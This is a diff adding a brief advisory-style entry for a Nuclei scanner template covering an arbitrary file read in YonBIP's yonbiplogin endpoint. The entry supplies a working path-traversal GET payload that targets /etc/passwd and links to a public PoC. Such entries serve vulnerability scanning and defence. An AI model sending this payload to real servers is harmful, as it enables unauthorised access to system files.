@@ -1,0 +1,19 @@
+# Nuclei Template: YonBIP - Arbitrary File Read
+**Template ID:** yonyou-yonbip-lfi
+**Vulnerability Class:** Relative Path Traversal
+**Severity:** High
+**CWE:** CWE-23
+**Source:** Nuclei Template (`yonyou-yonbip-lfi.yaml`)
+
+## Vulnerability Information & PoC
+
+## Description
+There is an arbitrary file reading vulnerability in yonbiplogin, the advanced version of YonBIP
+
+## Steps to reproduce / Exploit Payload
+```http
+GET {{BaseURL}}/iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js
+```
+
+## References
+- https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BYonBIP%E9%AB%98%E7%BA%A7%E7%89%88yonbiplogin%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
